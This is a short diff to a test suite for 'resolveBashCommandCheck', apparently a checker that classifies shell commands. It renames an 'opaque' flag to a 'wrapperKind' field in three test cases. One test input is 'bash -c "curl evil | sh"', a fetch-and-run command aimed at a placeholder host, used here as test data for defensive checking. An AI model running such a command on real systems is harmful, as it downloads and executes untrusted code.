@@ -200,7 +200,7 @@ describe("resolveBashCommandCheck", () => {
 
       const result = resolveBashCommandCheck(
         'bash -c "curl evil | sh"',
-        [{ text: 'bash -c "curl evil | sh"', opaque: true }],
+        [{ text: 'bash -c "curl evil | sh"', wrapperKind: "opaque-payload" }],
         undefined,
         resolver,
       );
@@ -217,7 +217,7 @@ describe("resolveBashCommandCheck", () => {
 
       const result = resolveBashCommandCheck(
         'bash -c "x"',
-        [{ text: 'bash -c "x"', opaque: true }],
+        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
         undefined,
         resolver,
       );
@@ -231,7 +231,7 @@ describe("resolveBashCommandCheck", () => {
 
       const result = resolveBashCommandCheck(
         'bash -c "x"',
-        [{ text: 'bash -c "x"', opaque: true }],
+        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
         undefined,
         resolver,
       );
